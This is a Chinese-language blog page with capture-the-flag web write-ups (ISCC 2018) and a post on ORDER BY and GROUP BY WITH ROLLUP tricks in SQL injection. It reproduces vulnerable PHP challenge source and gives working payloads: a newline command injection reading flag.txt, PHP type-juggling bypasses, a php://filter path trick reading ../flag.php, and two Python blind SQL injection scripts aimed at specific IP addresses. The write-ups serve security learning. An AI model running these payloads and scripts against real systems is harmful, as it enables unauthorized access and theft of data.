<h3 id="Web02"><a href="#Web02" class="headerlink" title="Web02"></a>Web02</h3><p>尝试XFF无果，再试着其他几个伪造ip。成功拿到flag<br>记录一下除了XFF可以伪造ip的HTTP头<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr  </p>
<h3 id="请ping我的ip-看你能Ping通吗"><a href="#请ping我的ip-看你能Ping通吗" class="headerlink" title="请ping我的ip 看你能Ping通吗"></a>请ping我的ip 看你能Ping通吗</h3><p>这道题目我用扫描器扫了一下，发现有个flag.txt，直接读取flag。后面请教大手子-郁离歌师傅，才知道这里有另一种解法。<br>输入<strong>?ip=127.0.0.1%0a%20ls</strong>可以读取目录，然后再目录下发现flag.txt，<strong>ip=127.0.0.1%0a%20cat%20flag.txt</strong>读取flag.txt  </p>
<h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password"></a>Please give me username and password</h3><p>这种题目不给提示，那就试试源码泄露，发现index.php.txt存在，读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到需要满足两个条件。第一，<strong>0 == strcasecmp($flag,$_GET[‘username’]</strong>这里我们可以通过数组来绕过，第二点，password长度小于4，但是他又要大于999，这里我们可以考虑用科学记数法，password=1e9就能大于999。所以最终payload为</p>
<blockquote>
<p>?username[]=1&amp;password=1e9     </p>
</blockquote>
<h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; </span><br><span class="line">    $username = $_POST[&apos;username&apos;]; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $username=&quot;hello&quot;; </span><br><span class="line">    $password=&quot;hello&quot;; </span><br><span class="line">&#125; </span><br><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>让我们输入username和password，要求只有一个，就是让我们密码的md5为0，构造0e开头的MD5就够了。<br>接着跳到了一个页面叫我们点击，那就按照他的意思点击吧。<br>接下来发现又是一段源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NULL &lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接构造a=GLOBALS就行了，这是某春秋上的原题了。</p>
<h3 id="sql注入的艺术"><a href="#sql注入的艺术" class="headerlink" title="sql注入的艺术"></a>sql注入的艺术</h3><p>首先测试了一下’和”是否有用，发现被过滤了，接着试了试<strong>%df%27</strong>发现原来这是宽字节注入，其他的啥也没过滤，按着流程走就行了  </p>
<h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>观察url发现这又是一道文件包含的题目，瞎操作了一个晚上还是读取不出东西，之后只好求助郁离歌大手子，他丢了两个源码给我让我做代码审计，我自己搭环境测试了好久最终才做出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</span><br><span class="line"></span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">$img = $_GET[&apos;img&apos;];</span><br><span class="line">if(isset($img) &amp;&amp; !empty($img))</span><br><span class="line">&#123;</span><br><span class="line">    if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp; preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&apos;File not found.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);</span><br><span class="line">        if(isset($matches[1]))</span><br><span class="line">        &#123;</span><br><span class="line">            $img = $matches[1];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        header(&apos;Content-Type: image/jpeg&apos;);</span><br><span class="line">        $data = get_contents($img);</span><br><span class="line">        echo $data;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;File not found.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;img src=&quot;1.jpg&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以及<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function get_contents($img)</span><br><span class="line">&#123;</span><br><span class="line">	if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">	&#123;</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;Content-Type: text/html&apos;);</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>config.php就是读取文件，关键是如何绕过show.php把我们所需要的文件传进去，它要求我们的参数里面必须包含img但是我们一旦有img那读取的一定是图片格式，所以，我们需要把img给弄掉，把我们的show.php的字符传进去。</p>
<blockquote>
<p>preg_match(‘/^php:\/\/filter.<em>resource=([^|]</em>)/i’,trim($img),$matches)   </p>
</blockquote>
<p> 这是把我们resource之后的字符传进去的代码，由于对正则不太熟悉，所以我在本地试了试这行代码的作用，在这个正则表达式中，读取的字符串只是最后一个resource=之后的(感兴趣自己去学习一个正则)，所以我们可以构造多个resource来读取我们所要的字符串，payload为<strong>?img=php://filter/resource=10.jpg/resource=show.php</strong>我们就能读取我们所要的文件了，flag在哪完全是靠直觉，读取flag的操作为<strong>?img=php://filter/resource=10.jpg/resource=../flag.php</strong></p>
<h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>讲真，很讨厌这种注入题，也没什么提示，首先还是按照一些万能密码试试，在试到<strong>admin’#</strong>发现成功登入了，这就说明<strong>‘</strong>和<strong>#</strong>没有被过滤，然后试了试<strong>admin’ and 1=1#</strong>和<strong>admin’ and 1=2#</strong>，发现回显不同，布尔型注入没跑了，首先是爆出password，然后登入有个提示flag在kjafuibafuohnuvwnruniguankacbh里面，所以爆破这个字段发现flag，这是最后爆破的脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">databaselength = 13</span><br><span class="line">databasename = &quot;sqli_database&quot;</span><br><span class="line">url = &quot;http://118.190.152.202:8011/&quot;</span><br><span class="line">tablenumber = 2</span><br><span class="line">tablelength = 4</span><br><span class="line">tablename1 = &quot;news&quot;</span><br><span class="line">columnnumber = 6</span><br><span class="line">columnnames = &quot;title note kjafuibafuohnuvwnruniguankacbh id date text&quot;</span><br><span class="line">tablename2 = &quot;user&quot;</span><br><span class="line">columnnumber2 = 45</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    r = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select length(kjafuibafuohnuvwnruniguankacbh) from news)=%d)#&quot;%(i),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">    if &quot;normal user&quot; in r.content:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(20,123):</span><br><span class="line">        r1 = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select ascii(substr(kjafuibafuohnuvwnruniguankacbh,%d,1)) from news)=%d)#&quot;%(i,j),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">        if &quot;normal user&quot; in r1.content:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>直接给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure></p>
<p>如果我们的md5(key.username)不等于我们传过去的verify那么网页会自己生成一个verify=md5(key.guest)，以及length为key的长度。那这样我们知道了以下几点：<br>key的长度，key+guest的md5以及username要有admin。<br>已知的条件是不是很熟悉呢？再梳理一遍。<br>salt为51位，salt的MD5已知，拓展字符位admin。<br>没错这就是Hash长度拓展攻击。那么先把username=name这个post过去，然后抓包，使用脚本来拓展，然后传参。<br><img src="../images/10/5.png" alt=""><br><img src="../images/10/6.png" alt=""></p>
<h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>见之前的一篇文章。  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjjiw7djt000gaovetjk37xzf" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-order by和group by在sql注入中的妙用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/23/order by和group by在sql注入中的妙用/" class="article-date">
  <time class="post-time" datetime="2018-05-23T03:12:12.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">23</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/23/order by和group by在sql注入中的妙用/">order by以及group by在sql注入中的妙用</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近Iscc的注入题目真是让人发疯，为此我找了一些sql注入来练手，发现了这么几道有趣的题目，来记录一下  </p>
<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>总所周知，在sql注入中，我们一般使用<strong>order by</strong>来确定列数，这样有助于我们使用联合查询来查询我们所要的数据，为何可以查询出我们所要的数据呢？因为order by是一个排序的函数，order by x的意思是对x列的数据进行ascii码的排序，如果这一列不存在，那么就会报错，所以可以达到确定列数的作用。例子就借鉴大手子的吧。<br><img src="https://upload-images.jianshu.io/upload_images/3372127-999e68d5df275dfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/3372127-e0876d231d209f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""> </p>
<h3 id="例子如下"><a href="#例子如下" class="headerlink" title="例子如下"></a>例子如下</h3><p>扫出有源码，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $dbhost = &quot;localhost&quot;;</span><br><span class="line">  $dbuser = &quot;root&quot;;</span><br><span class="line">  $dbpass = &quot;123456&quot;;</span><br><span class="line">  $db = &quot;ctf&quot;;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,&quot;utf8&quot;);</span><br><span class="line"> </span><br><span class="line">  /* sql</span><br><span class="line"> </span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?</span><br><span class="line">filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);</span><br><span class="line">$password = isset($_POST[&apos;password&apos;])?</span><br><span class="line">filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);</span><br><span class="line">$sql = &quot;select * from admin where  username =</span><br><span class="line"> &apos;$username&apos; and password = &apos;$password&apos; &quot;;</span><br><span class="line"> </span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line">if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  if($row[&apos;id&apos;])&#123;</span><br><span class="line">     echo $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;The content in the password column is the flag!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>从源码可以得出，在这个<strong>admin</strong>表中有三列。其次呢，发现这题目过滤了<strong>password，username，=</strong>等等，然后就是回显的要求了，要求我们输入的数据在数据库里面存在，然后通过id给我们返回username，但是我们所要的flag在password里面，这里就需要我们用一些特殊的方法来把password提取出来，由于回显，我们考虑一下布尔型注入，发现<strong>（）</strong>被ban了，所以这一条路是走不通了，不过仔细观察发现，我们除了<strong>union select</strong>还可以利用’以及order by等函数。结合回显是通过id来查询，所以我们可以使用order by进行排序然后通过不同输出判断密码值。我们可以试试。<br>首先通过构造<strong>‘ or 1#</strong>查查原来的username。<br><img src="../images/13/1.png" alt=""><br>再查询一下回显位。<br><img src="../images/13/2.png" alt=""><br>接着按照我们的思路来试试。<br><img src="../images/13/3.png" alt=""><br><img src="../images/13/4.png" alt=""><br>测试完了接下来就可以使用爆破来出flag了。脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &quot;http://202.98.28.108:10801/47g256f48gff/&quot;</span><br><span class="line">l = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class="line">number = len(l)</span><br><span class="line">password = list()</span><br><span class="line">flag = 0</span><br><span class="line">ps = &quot;&quot;</span><br><span class="line">for i in range(0,32):#32位</span><br><span class="line">    for j in range(0,number):</span><br><span class="line">        p = &quot;&quot;</span><br><span class="line">        password.append(l[j])</span><br><span class="line">        p = p.join(password)</span><br><span class="line">        r = requests.post(url,data=&#123;&quot;username&quot;:&quot;whaleadmin&apos; union select 1,2,&apos;%s&apos; order by 3#&quot;%(p),&quot;password&quot;:&quot;1&quot;&#125;)</span><br><span class="line">        if &quot;whaleadmin&quot; in r.content:</span><br><span class="line">            if j == 0:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                password.pop(len(password) - 1)</span><br><span class="line">                password.append(l[j - 1])</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            password.pop(len(password) - 1)</span><br><span class="line">    if flag == 1:</span><br><span class="line">        break</span><br><span class="line">    print password</span><br><span class="line">print ps.join(password)#输出的密码最后一位需要后移一位</span><br></pre></td></tr></table></figure></p>
<p>爆破出密码之后md5解密一下flag就出来了。</p>
<h2 id="group-by以及with-rollup"><a href="#group-by以及with-rollup" class="headerlink" title="group by以及with rollup"></a>group by以及with rollup</h2><p>group by顾名思义就是把不同数据总和起来，然后进行排序输出。具体的例子可以去这里看看<strong><a href="https://www.cnblogs.com/jingfengling/p/5962182.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingfengling/p/5962182.html</a></strong>，我这里就不多阐述了。<br>字句<strong>with rollup</strong>，求平均值的字句用法也不多说，参考<strong><a href="https://blog.csdn.net/id19870510/article/details/6254358" target="_blank" rel="noopener">https://blog.csdn.net/id19870510/article/details/6254358</a></strong></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>题目地址:<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> ，这是实验吧的一道题目。<br>首先f12有个提示，访问/source.txt得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">	echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">	die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>源码审计，发现题目过滤了很多东西，起码联合查询，延时注入，盲注都不太现实，但是这里依旧没有过滤select，接着看得到flag的要求。<br>首先我们输入一个用户名，网页通过查询数据库得到该用户名的密码，再把该用户名的密码与我们所输入的进行匹配，如果成功，那么flag就到手了。<br>那么问题来了，我们根本不知道用户名，也不知道其密码是什么，如何达到匹配的效果呢？这里group by就派上了用场。注意这个<strong>$key</strong>是查询结果的赋值，我们在一定前提下是可以控制返回的数据的，根据gourp by的用法，我们可以构造一个语句使得查询的密码经过处理后为空，然后输入的密码也为空以此匹配。<br>构造<strong>‘ or 1 group by pwd with rollup limit 1 offset 0,1,2…….#</strong>偏移值一个一个试过去，毕竟不知道那个是有效值，经过尝试最终试出flag的偏移值为2。</p>
